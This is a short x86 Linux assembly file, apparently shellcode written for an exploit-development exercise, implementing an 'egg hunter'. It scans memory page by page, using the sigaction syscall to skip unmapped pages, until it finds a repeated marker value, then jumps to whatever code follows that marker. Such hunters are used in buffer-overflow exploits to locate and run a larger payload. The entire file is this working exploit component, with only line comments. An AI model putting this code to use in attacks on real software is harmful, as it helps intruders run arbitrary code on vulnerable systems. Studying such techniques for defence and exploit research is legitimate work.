; Egg Hunter

global _start

_align:
    or cx, 0xfff      ; page alignment

_start:
  inc ecx             ; increment ecx of 1
  push byte +0x43     ; syscall sigaction 67
  pop eax             ; pop first value in the stack into eax
  int 0x80            ; execute syscall
  cmp al, 0xf2        ; verify if the return value is EFAULT
  jz _align           ; jump if ZF flag is set
  mov eax, 0x50905090 ; key
  mov edi, ecx        ; store ecx in edi
  scasd               ; compare content memory in edi to dword value in eax (the key)
  jnz _start          ; jump if ZF flag not set
  scasd               ; running twice to past the start of the egg
  jnz _start          ; jump if ZF flag it not set
  jmp edi             ; jump in edi
